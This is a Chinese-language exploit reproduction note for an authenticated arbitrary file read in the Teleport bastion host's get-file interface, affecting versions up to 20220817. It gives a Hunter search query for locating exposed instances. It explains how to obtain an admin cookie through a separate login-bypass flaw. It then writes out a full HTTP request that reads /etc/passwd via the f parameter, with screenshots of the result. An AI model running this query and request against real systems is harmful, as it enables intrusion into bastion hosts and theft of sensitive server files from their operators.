# Teleport堡垒机 get-file 后台任意文件读取漏洞

# 一、漏洞简介
Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者利用任意用户登录漏洞后可以获取后台权限，再进一步利用任意文件读取获取服务器上的敏感文件

# 二、影响版本
+ Teleport堡垒机<= 20220817  


# 三、资产测绘
+ hunter`app.name="Teleport 堡垒机系统"`
+ 特征

![1700224400227-6b4b586e-6399-4e83-8cb6-7af26e9b2218.png](./img/wf_kz4gZxf1izLnh/1700224400227-6b4b586e-6399-4e83-8cb6-7af26e9b2218-967661.png)

# 四、漏洞复现
1. 通过`Teleport堡垒机 do-login 任意用户登录漏洞`登录后台，获取管理员cookie

![1700225092406-56c1fcf6-9f0d-49f2-83f2-7d97ab0f1928.png](./img/wf_kz4gZxf1izLnh/1700225092406-56c1fcf6-9f0d-49f2-83f2-7d97ab0f1928-923223.png)

2. 通过上一步获取到的cookie读取服务器上的文件

```plain
GET /audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Upgrade-Insecure-Requests: 1
```

![1700225157574-3c40beac-b489-43ea-b047-ac449a073872.png](./img/wf_kz4gZxf1izLnh/1700225157574-3c40beac-b489-43ea-b047-ac449a073872-489991.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wg3n45g9dgsgstm6>